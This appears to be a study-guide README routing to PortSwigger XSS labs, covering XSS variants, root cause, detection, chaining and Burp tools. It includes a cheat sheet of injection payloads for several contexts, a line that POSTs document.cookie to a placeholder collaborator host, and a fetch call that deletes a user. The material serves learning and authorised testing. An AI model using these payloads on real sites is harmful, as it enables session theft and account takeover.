# XSS (Cross-site scripting) - topic overview & router

XSS executes attacker-controlled JavaScript in a victim's browser. Three variants: **Reflected** (payload in URL, triggered when victim clicks); **Stored** (payload persisted in DB, triggers for every viewer); **DOM-based** (source->sink entirely in client-side JS, never touches server). Impact: session hijack, credential theft, CSRF bypass, keylogging, phishing.

## 30-second quick reference

```
# HTML context (no encoding)
<script>alert(1)</script>
<img src=1 onerror=alert(1)>

# Attribute context (angle brackets encoded - break out of value)
" onmouseover="alert(1)
# href attribute (javascript: URI - no quotes needed)
javascript:alert(1)

# JavaScript string context
';alert(1)//              # break out with '
\';alert(1)//             # if ' escaped but \ not: inject \ to un-escape
</script><script>alert(1)</script>  # HTML parser closes block before JS parses
${alert(1)}               # template literal - ${ executes

# DOM sinks
"><svg onload=alert(1)>   # document.write (break out of img src)
<img src=1 onerror=alert(1)>  # innerHTML (script tags don't execute)
javascript:alert(1)       # href sink
{{$on.constructor('alert(1)')()}}  # AngularJS ng-app expression

# Weaponized (exfiltration)
fetch('https://COLLAB',{method:'POST',mode:'no-cors',body:document.cookie})
```

## Decision map

| Observation | Sub-technique | Key payload |
|---|---|---|
| Input in raw HTML, nothing encoded | [HTML-and-attribute-context](HTML-and-attribute-context/) | `<script>alert(1)</script>` |
| Input inside an attribute value, `<>` encoded | [HTML-and-attribute-context](HTML-and-attribute-context/) | `" onmouseover="alert(1)` |
| Input inside href, `"` encoded | [HTML-and-attribute-context](HTML-and-attribute-context/) | `javascript:alert(1)` |
| Input inside a JS string literal | [JavaScript-context](JavaScript-context/) | `';alert(1)//` or `\';alert(1)//` |
| Input inside a JS template literal | [JavaScript-context](JavaScript-context/) | `${alert(1)}` |
| Input flows through client-side JS to innerHTML/document.write/href | [DOM-based](DOM-based/) | context-dependent |
| Input in ng-app AngularJS context | [DOM-based](DOM-based/) | `{{$on.constructor('alert(1)')()}}` |
| Tags/attributes WAF-filtered | [WAF-filter-bypass](WAF-filter-bypass/) | Intruder tag/attr brute; SVG/custom tags |
| CSP blocks inline scripts | [CSP-bypass](CSP-bypass/) | AngularJS sandbox; CSP injection; dangling markup |
| XSS confirmed - need to weaponize | [Exploiting-XSS](Exploiting-XSS/) | fetch cookie/creds to Collaborator; CSRF token extract |

## Sub-technique folders
- `HTML-and-attribute-context/` - bare HTML, attribute break-out, href protocol (4 labs)
- `JavaScript-context/` - JS string, event handler, template literal (5 labs)
- `DOM-based/` - document.write/innerHTML/href/jQuery sinks; AngularJS expressions (8 labs)
- `WAF-filter-bypass/` - tag/event allowlists, SVG, canonical link, event-handler-blocked (6 labs)
- `CSP-bypass/` - AngularJS sandbox escape, dangling markup, CSP report-uri injection (4 labs)
- `Exploiting-XSS/` - steal cookies, capture passwords, CSRF token extraction (3 labs)

## Root cause
User input is inserted into page output without context-appropriate encoding. HTML context needs HTML encoding; attribute values need attribute encoding; JS strings need JS escaping; URLs need URL encoding. Mixing contexts (e.g., JS string inside an HTML attribute) creates layered vulnerabilities. DOM-based XSS occurs when JS reads from a source (location.search, location.hash, document.referrer, postMessage) and writes to a sink without sanitization.

## Find it
- Submit `<>"'` to every input; observe what gets encoded in the response.
- Check the source context: is your input in raw HTML? Inside `<tag attr="here">`? Inside `<script>var x="here"</script>`?
- DOM: DevTools -> Sources -> Ctrl+F for `innerHTML`, `document.write`, `eval`, `location`, `jQuery $(`); or use Burp DOM Invader.
- Test every form field, URL param, HTTP header that gets reflected anywhere in the response or error.

## Chaining
- XSS -> `fetch(document.cookie)` -> [Authentication](../Authentication/) (session hijack)
- XSS -> extract CSRF token -> CSRF attack on any sensitive action
- Stored XSS in comment/post visible to admin -> admin account takeover -> [Access-control](../Access-control/)
- DOM XSS via postMessage -> [CORS](../CORS/) (cross-origin data theft)
- XSS -> `fetch('/admin/delete?user=carlos')` (same-origin) -> delete users without CSRF

## Tools
- **Burp Repeater** - test payloads, observe context
- **Burp Intruder** - brute-force allowed tags/events (WAF bypass)
- **Burp Collaborator** - receive exfiltrated cookies/credentials
- **Burp DOM Invader** - automated DOM source/sink tracing
- **XSS cheat sheet** - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

## References
- https://portswigger.net/web-security/cross-site-scripting
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
